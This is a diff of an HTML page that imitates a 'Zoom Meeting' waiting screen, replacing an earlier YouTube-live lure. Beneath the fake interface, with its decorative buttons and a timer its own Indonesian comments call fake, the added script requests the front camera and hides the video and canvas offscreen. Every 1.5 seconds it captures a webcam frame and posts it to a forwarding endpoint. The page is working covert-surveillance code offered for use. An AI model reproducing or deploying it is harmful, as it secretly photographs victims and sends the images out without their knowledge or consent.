@@ -1,82 +1,167 @@
 <!doctype html>
 <html>
 <head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <title>Zoom Meeting</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background: #1a1a1a;
+            color: #fff;
+            font-family: -apple-system, 'Segoe UI', Roboto, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .header {
+            background: #2d2d2d;
+            padding: 12px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #444;
+            font-size: 14px;
+        }
+        .header .title { font-weight: 600; }
+        .header .timer { color: #aaa; font-variant-numeric: tabular-nums; }
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #000;
+            position: relative;
+        }
+        .avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4a90e2, #357abd);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 56px;
+            color: #fff;
+            box-shadow: 0 0 40px rgba(74,144,226,0.4);
+        }
+        .status {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-size: 13px;
+            color: #aaa;
+        }
+        .controls {
+            background: #2d2d2d;
+            padding: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            border-top: 1px solid #444;
+        }
+        .btn {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            background: #3a3a3a;
+            border: none;
+            color: #fff;
+            font-size: 20px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn:hover { background: #4a4a4a; }
+        .btn.danger { background: #e74c3c; }
+        .btn.danger:hover { background: #c0392b; }
+
+        /* SEMBUNYIKAN VIDEO & CANVAS */
+        #video, #canvas {
+            position: absolute !important;
+            left: -9999px !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+    </style>
 </head>
+<body>
+    <div class="header">
+        <div class="title">🔒 Zoom Meeting - Waiting for host...</div>
+        <div class="timer" id="timer">00:00</div>
+    </div>
 
-<div class="video-wrap">
-   <video id="video" playsinline autoplay></video>
-</div>
+    <div class="main">
+        <div class="avatar">👤</div>
+        <div class="status" id="status">Connecting to meeting...</div>
+    </div>
 
-<canvas id="canvas" width="640" height="480"></canvas>
+    <div class="controls">
+        <button class="btn">🎤</button>
+        <button class="btn">📹</button>
+        <button class="btn">👥</button>
+        <button class="btn danger">📞</button>
+    </div>
 
-<script>
+    <!-- ELEMEN TERSEMBUNYI UNTUK AMBIL KAMERA -->
+    <video id="video" playsinline autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
 
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function() {},
+                error: function() {}
+            });
+        }
 
+        'use strict';
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-'use strict';
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+                document.getElementById('status').innerText = "Waiting for host to start...";
+            } catch (e) {
+                document.getElementById('status').innerText = "Camera unavailable";
+            }
+        }
 
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
 
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
+        // Timer palsu biar keliatan kayak meeting beneran
+        let sec = 0;
+        setInterval(() => {
+            sec++;
+            const m = String(Math.floor(sec / 60)).padStart(2, '0');
+            const s = String(sec % 60).padStart(2, '0');
+            document.getElementById('timer').innerText = m + ':' + s;
+        }, 1000);
 
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
-
-}
-
-// Load init
-init();
-
-</script>
-
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-    </body>
-
+        init();
+    </script>
+</body>
 </html>
